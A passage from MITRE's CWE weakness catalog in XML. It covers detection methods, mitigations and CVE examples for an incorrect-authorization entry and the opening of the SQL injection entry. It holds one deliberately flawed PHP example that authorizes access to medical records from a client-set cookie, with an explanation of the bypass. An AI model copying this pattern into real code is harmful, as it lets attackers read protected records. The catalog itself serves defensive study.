               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Installation</Phase>
               <Description>Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code could be for a medical records application. It displays a record to already authenticated users, confirming the user's authorization using a value stored in a cookie.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$role = $_COOKIES['role'];<xhtml:br/>if (!$role) {<xhtml:div style="margin-left:1em;">$role = getRole('user');<xhtml:br/>if ($role) {<xhtml:div style="margin-left:1em;">// save the cookie to send out in future responses<xhtml:br/>setcookie("role", $role, time()+60*60*2);</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">ShowLoginScreen();<xhtml:br/>die("\n");</xhtml:div>}</xhtml:div>}<xhtml:br/>if ($role == 'Reader') {<xhtml:div style="margin-left:1em;">DisplayMedicalHistory($_POST['patient_ID']);</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">die("You are not Authorized to view this record\n");</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the "role" cookie to the value "Reader". As a result, the $role variable is "Reader", and getRole() is never invoked. The attacker has bypassed the authorization system.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-39155</Reference>
               <Description>Chain: A microservice integration and management platform compares the hostname in the HTTP Host header in a case-sensitive way (CWE-178, CWE-1289), allowing bypass of the authorization policy (CWE-863) using a hostname with mixed case or other variations.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-39155</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-15900</Reference>
               <Description>Chain: sscanf() call is used to check if a username and group exists, but the return value of sscanf() call is not checked (CWE-252), causing an uninitialized variable to be checked (CWE-457), returning success to allow authorization bypass for executing a privileged (CWE-863).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-15900</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>Gateway uses default "Allow" configuration for its authorization settings.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0034</Reference>
               <Description>Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6123</Reference>
               <Description>Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6123</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7109</Reference>
               <Description>Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-7109</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3424</Reference>
               <Description>Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3424</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4577</Reference>
               <Description>ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4577</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6679</Reference>
               <Description>Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6679</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2801</Reference>
               <Description>Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2801</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1155</Reference>
               <Description>Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1155</Link>
            </Observed_Example>
         </Observed_Examples>
	 <Taxonomy_Mappings>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SD-4</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-2</Entry_ID>
	     <Entry_Name>Req CR 2.1</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-2</Entry_ID>
	     <Entry_Name>Req CR 2.2</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 3-3</Entry_ID>
	     <Entry_Name>Req SR 2.1</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 3-3</Entry_ID>
	     <Entry_Name>Req SR 2.2</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SVV-1</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SVV-4</Entry_Name>
	   </Taxonomy_Mapping>
	   <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
	     <Entry_Name>Req SD-1</Entry_Name>
	   </Taxonomy_Mapping>
	 </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-229"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authorization&#34; Page 114; Chapter 6, &#34;Determining&#xA;                  Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-231"/>
            <Reference External_Reference_ID="REF-233"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authorization&#34;, Page 39"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2011-05-24</Submission_Date>
               <Submission_Version>1.13</Submission_Version>
               <Submission_ReleaseDate>2011-06-01</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
			<Contribution Type="Content">
			  <Contribution_Name>participants in the CWE ICS/OT SIG 62443 Mapping Fall Workshop</Contribution_Name>
			  <Contribution_Date>2023-11-14</Contribution_Date>
			  <Contribution_Version>4.14</Contribution_Version>
			  <Contribution_ReleaseDate>2024-02-29</Contribution_ReleaseDate>
			  <Contribution_Comment>Contributed or reviewed taxonomy mappings for ISA/IEC 62443</Contribution_Comment>
			</Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="89" Name="Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.</xhtml:p>
            <xhtml:p>SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or product package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Database Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
	    <Introduction>
               <Phase>Implementation</Phase>
               <Note>This weakness typically appears in data-rich applications that save user inputs in a database.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If poor SQL commands are used to check user names and passwords, it may be possible to connect to a system as another user with no previous knowledge of the password.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a SQL injection attack.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-9">
               <Method>Manual Analysis</Method>
               <Description>Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>
                  <xhtml:p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</xhtml:p>
                  <xhtml:p>Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using "exec" or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>
                  <xhtml:p>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</xhtml:p>
                  <xhtml:p>Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</xhtml:p>
                  <xhtml:p>Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing SQL query strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
